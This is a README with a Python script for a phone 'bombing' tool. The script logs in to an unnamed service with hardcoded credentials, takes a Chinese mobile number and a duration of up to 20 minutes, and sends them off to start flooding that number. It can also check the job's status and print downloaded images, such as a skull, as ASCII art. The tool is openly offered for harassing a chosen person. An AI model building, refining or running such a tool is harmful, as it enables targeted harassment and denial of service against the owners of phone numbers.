# BIGBOOM!!!!

![2](1\2.jpg)



![2](1\1.jpg)

```python
import requests
import sys
import os
import cv2
import re
import colorama
from urllib.parse import urlparse
# 初始化colorama
colorama.init()


def random_img():
    # 获取并添加文件扩展名
    def add_file_extension(filename, url):
        parsed = urlparse(url)
        root, ext = os.path.splitext(parsed.path)
        return filename + ext.strip()

    # 下载图片并命名
    url = 'https://api.ghser.com/random/pe.php'
    response = requests.get(url)

    filename = os.path.basename(url)
    filename = os.path.splitext(filename)[0]
    filename = add_file_extension(filename, url)

    with open(filename, 'wb') as f:
        f.write(response.content)
    print("已获取二次元图片，请去目录下查验")
    img = cv2.imread(filename, 0)  # 读入灰度图

    def img_color_ascii(img, r=3):
        # img: input img
        # r:  raito params #由于不同控制台的字符长宽比不同，所以比例需要适当调整。
        # window cmd：r=3/linux console r=

        grays = "@%#*+=-:. "  # 由于控制台是白色背景，所以先密后疏/黑色背景要转置一下
        gs = 10  # 10级灰度
        # grays2 = "$@B%8&WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~i!lI;:,\"^.` "
        # gs2 = 67              #67级灰度

        # 宽（列）和高（行数）
        w = img.shape[1]
        h = img.shape[0]
        ratio = r * float(w) / h  # 调整长宽比-根据终端改变r

        scale = w // 100  # 缩放尺度/取值步长，向下取整，每100/50个像素取一个 值越小图越小(scale 越大)

        for y in range(0, h, int(scale * ratio)):  # 根据缩放长度 遍历高度 y对于h，x对应w
            strline = ''
            for x in range(0, w, scale):  # 根据缩放长度 遍历宽度
                idx = img[y][x] * gs // 255  # 获取每个点的灰度  根据不同的灰度填写相应的 替换字符
                if idx == gs:
                    idx = gs - 1  # 防止溢出
                # 将真彩值利用命令行格式化输出赋予
                color_id = "\033[38;5;%dm%s" % (img[y][x], grays[2])  # 输出！
                strline += color_id  # 按行写入控制台
            print(strline)

    img_color_ascii(img)


def menu():
    while True:
        choice = input("请选择功能：\n1. 发起轰炸\n2. 查询轰炸状态\n3. 退出程序\n4.获取二次元图片")
        if choice == "1":
            boom()
            back = input("输入q返回菜单，否则退出程序\n")
            os.system('cls')
            if back == "q":
                continue
            else:
                break
        elif choice == "2":
            getBoomLog()
            back = input("输入q返回菜单，否则退出程序\n")
            os.system('cls')
            if back == "q":
                continue
            else:
                break
        elif choice == "3":
            break
        elif choice == "4":
            random_img()
            back = input("输入q返回菜单，r重新获取图片，否则退出程序\n")
            os.system('cls')
            if back == "q":
                continue
            elif back== "r":
                random_img()
                continue
            else:
                break
        else:
            print("输入不合法，请重新输入！\n")

def sign_in():
    sign_in_url = "接口地址"
    sign_in_data = {
        "username": "3300519161",
        "password": "3300519161",
        "rememberMe": "true"
                    }
    sign_in_headers = {
        "content-length": "54",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "接口地址",
        "referer": "接口地址",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57"
    }
    sign_in_rsp = requests.post(url=sign_in_url, data=sign_in_data, headers=sign_in_headers)
    print("获取数据成功！")
    return sign_in_rsp

def getCookies():
    sign_in_rsp=sign_in()
    global cookieStr, global_headers
    cookieStr = ''
    for item in sign_in_rsp.cookies:
        cookieStr = cookieStr + item.name + '=' + item.value + ';'
    global_headers = {
        'Cookie': cookieStr,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57'
    }

def boom():
    get_img("https://picnew12.photophoto.cn/20171117/kuloutouguowangmiankoupsdtoumingsucai-29174408_1.jpg")
    while True:
        phone = input("请输入你要轰炸的手机号：")
        if not re.match(r'^1[3456789]\d{9}$', phone):
            print("手机号格式不正确，请重新输入")
            continue
        else:
            print("手机号输入正确：", phone)
            break
    minute=input("请输入你要轰炸的时间【分钟 最长20分钟】：")
    url="接口地址"
    data={
        "phone": f"{phone}",
        "time": f"{minute}"
    }
    resp_boom=requests.post(url=url,data=data,headers=global_headers)
    print("任务执行开始！\n"+resp_boom.text)

def process_json(json_data, phone_number):
    data = json_data['data']
    for item in data:
        if item['phone'] == phone_number:
            last_time = item['lasttime']
            end_time = item['endtime']
            add_time = item['addtime']
            run_time= item['time']
            if run_time == '0':
                print("任务已结束，"+f"phone:{phone_number}，lasttime: {last_time}, endtime: {end_time}, addtime: {add_time}")
            elif last_time == "0000-00-00 00:00:00":
                print("等待开始，"+f"phone:{phone_number}，lasttime: {last_time}, endtime: {end_time}, addtime: {add_time}")
            else:
                print(f"任务进行中,剩余轰炸时间【{run_time}min】")

def getBoomLog():
    get_img("https://c-ssl.dtstatic.com/uploads/item/201904/30/20190430010307_tavtt.thumb.1000_0.jpg")
    while True:
        phone_num = input("请输入你要轰炸的手机号：")
        if not re.match(r'^1[3456789]\d{9}$', phone_num):
            print("手机号格式不正确，请重新输入")
            continue
        else:
            print("手机号输入正确：", phone_num)
            break
    # getCookies()
    resp=requests.get(url="接口地址",headers=global_headers)
    process_json(resp.json(),f"{phone_num}")


def get_img(url):
    url = f"{url}"
    response = requests.get(url)
    with open("image.jpg", "wb") as f:
        f.write(response.content)

    img = cv2.imread('image.jpg', 0)  # 读入灰度图

    def img_color_ascii(img, r=3):
        # img: input img
        # r:  raito params #由于不同控制台的字符长宽比不同，所以比例需要适当调整。
        # window cmd：r=3/linux console r=

        grays = "@%#*+=-:. "  # 由于控制台是白色背景，所以先密后疏/黑色背景要转置一下
        gs = 10  # 10级灰度
        # grays2 = "$@B%8&WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1{}[]?-_+~i!lI;:,\"^.` "
        # gs2 = 67              #67级灰度

        # 宽（列）和高（行数）
        w = img.shape[1]
        h = img.shape[0]
        ratio = r * float(w) / h  # 调整长宽比-根据终端改变r

        scale = w // 100  # 缩放尺度/取值步长，向下取整，每100/50个像素取一个 值越小图越小(scale 越大)

        for y in range(0, h, int(scale * ratio)):  # 根据缩放长度 遍历高度 y对于h，x对应w
            strline = ''
            for x in range(0, w, scale):  # 根据缩放长度 遍历宽度
                idx = img[y][x] * gs // 255  # 获取每个点的灰度  根据不同的灰度填写相应的 替换字符
                if idx == gs:
                    idx = gs - 1  # 防止溢出
                # 将真彩值利用命令行格式化输出赋予
                color_id = "\033[38;5;%dm%s" % (
                img[y][x], grays[2])  # 输出！
                strline += color_id  # 按行写入控制台
            print(strline)

    img_color_ascii(img)


if __name__ == '__main__':
    getCookies()
    # getCookies()
    # getBoomLog()
    menu()
```

